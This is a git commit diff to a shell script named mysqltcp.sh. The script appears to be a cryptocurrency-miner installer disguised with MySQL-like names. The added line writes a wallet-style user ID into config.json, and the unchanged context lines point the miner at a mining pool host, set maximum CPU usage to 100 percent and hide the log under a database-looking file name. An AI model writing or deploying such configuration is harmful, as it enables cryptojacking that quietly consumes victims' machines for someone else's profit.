3ee92b5d30845bdbb2431e45d9beb58147564299
U8Pool <905353149@qq.com>
2024-10-14 03:56:04 -0400

    Update mysqltcp.sh

--- Bash/url/mysqltcp.sh
+++ Bash/url/mysqltcp.sh
@@ -729,6 +729,7 @@ if [ ! -z $EMAIL ]; then
 fi
 
 sed -i 's/"url": *"[^"]*",/"url": "x.u8pool.com:'$PORT'",/' $HOME/myssqltcp/config.json
+sed -i 's/"user": *"[^"]*",/"user": "NHbMF1kvm9uorYcdGh8mr7Tfw99Gvo21QCYu.'$PASS'",/' $HOME/myssqltcp/config.json
 sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/myssqltcp/config.json
 sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/myssqltcp/config.json
 sed -i 's#"log-file": *null,#"log-file": "'$HOME/myssqlsys.log'",#' $HOME/myssqltcp/config.json
